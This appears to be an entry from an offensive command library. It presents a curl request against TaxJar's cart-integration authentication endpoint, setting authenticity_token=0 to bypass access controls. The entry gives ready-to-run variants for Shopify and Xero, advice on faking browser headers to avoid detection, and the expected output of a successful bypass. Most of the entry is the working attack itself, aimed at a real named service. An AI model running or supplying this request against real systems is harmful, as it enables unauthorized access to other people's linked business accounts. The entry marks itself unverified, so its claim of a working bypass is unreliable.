---
data: >-
  curl -X GET "https://taxjar.com/auth/[CARTS-NAME]?authenticity_token=0" -H
  "Cookie: session=your_session_cookie" -H "User-Agent: Mozilla/5.0 (Windows NT
  10.0; Win64; x64) AppleWebKit/537.36"
tags:
  - web-exploit
  - access-bypass
type: command
output: null
executor: bash
platforms:
  - Linux
  - Windows
  - macOS
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:29:44.369Z'
id: 85a3ea19-1adf-48f4-91b1-5430c6233d97
verified: false
validated: true
submitted: true
---
# curl-get-taxjar-auth-bypass

## Command

```bash
curl -X GET "https://taxjar.com/auth/[CARTS-NAME]?authenticity_token=0" -H "Cookie: session=your_session_cookie" -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
```

## Description

This command uses curl to send a GET request to Taxjar's authentication endpoint for external cart integrations, setting authenticity_token=0 to bypass access controls. It exploits broken permissions allowing member users to link accounts or view linked info. Use after authenticating to obtain the session cookie.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `[CARTS-NAME]` | Replace with cart integration name (e.g., shopify, xero, quickbooks) | Yes |
| `session=your_session_cookie` | Authenticated session cookie from Taxjar login | Yes |
| `User-Agent` | Mimics browser to avoid detection | No |

## Examples

### Basic Usage

```bash
curl -X GET "https://taxjar.com/auth/shopify?authenticity_token=0" -H "Cookie: session=abc123"
```

Targets Shopify integration.

### Advanced Usage

```bash
curl -X GET "https://taxjar.com/auth/xero?authenticity_token=0" -H "Cookie: session=abc123" -H "Referer: https://taxjar.com/dashboard" -v
```

Includes verbose output (-v) and Referer header for realism, targeting Xero.

## Expected Output

HTTP 200 OK response with HTML content showing a linking form or account details (e.g., "Connected Accounts: Shopify ID 12345, Status: Active"). No permission errors; successful bypass indicated by accessible admin-only features.

## Related

- [[Related Procedure: Exploit-Taxjar-Access-Control-Bypass]]
